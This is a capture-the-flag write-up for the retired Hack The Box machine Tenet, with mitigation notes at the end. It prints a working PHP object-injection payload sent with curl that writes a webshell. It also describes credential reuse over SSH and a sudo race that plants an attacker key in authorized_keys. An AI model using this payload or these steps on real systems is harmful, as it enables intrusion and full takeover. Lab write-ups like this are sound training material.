---
machine: Tenet
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, wordpress, php-object-injection, race-condition, privesc]
---

# Tenet — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

WordPress and a `sator.php` reachable by IP allow PHP object injection with the `DatabaseExport` class, which writes a webshell. WordPress configuration leaks database credentials and `neil` reuses them for SSH. `neil` can run `enableSSH.sh` as root; the script has a race condition while writing a key and allows adding one.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH on Ubuntu 18.04 and `80/tcp` Apache with the default page.
- `gobuster` finds `/wordpress`; `wpscan` identifies the version and users.
- The `tenet.htb` vhost has a comment mentioning `sator.php`.

## Enumeration

- `sator.php` exists on the IP and accepts the `arepo` parameter with serialized data.
- The `DatabaseExport` class has `user_file` and `data`, and writes the latter into the former.
- `wp-config.php` contains database credentials for `neil`.

## Foothold

Serialize a `DatabaseExport` with `user_file=0xdf.php` and `data=<?php system($_REQUEST['cmd']); ?>`, send it to `sator.php` and run the webshell.

```bash
curl -G http://<IP>/sator.php --data-urlencode 'arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"0xdf.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}'
curl 'http://<IP>/0xdf.php?cmd=id'
```

## Lateral movement

The shell is `www-data`. Database credentials in `wp-config.php` work for `neil` over SSH; the home directory contains the user flag.

## Privilege escalation

`neil` can run `/usr/local/bin/enableSSH.sh` as root. The script creates a temporary file, writes a key and moves it into `authorized_keys`; race it so the attacker key ends up in the final file.

```bash
sudo -l
# run enableSSH.sh in a loop and replace the temporary file
sudo /usr/local/bin/enableSSH.sh
```

## Evidence

- `sator.php` with a `DatabaseExport` object and webshell.
- `neil` credentials and SSH session.
- `enableSSH.sh` race and key in `authorized_keys`.

## Lessons learned

- `unserialize` on user input enables file writes and code execution.
- WordPress credentials are often reused at the system level.
- Privileged scripts with temporary files are vulnerable to races.

## Mitigation and detection

- Do not deserialize external data; use JSON and allowed classes.
- Rotate database credentials and do not reuse them for SSH.
- Use `mktemp` and atomic operations in privileged scripts.

## References

- [0xdf — Tenet](https://0xdf.gitlab.io/2021/06/12/htb-tenet.html)
- [IppSec — Tenet](https://www.youtube.com/watch?v=LhdE7dXbTQw)
- [Hack The Box — Tenet](https://app.hackthebox.com/machines/tenet)
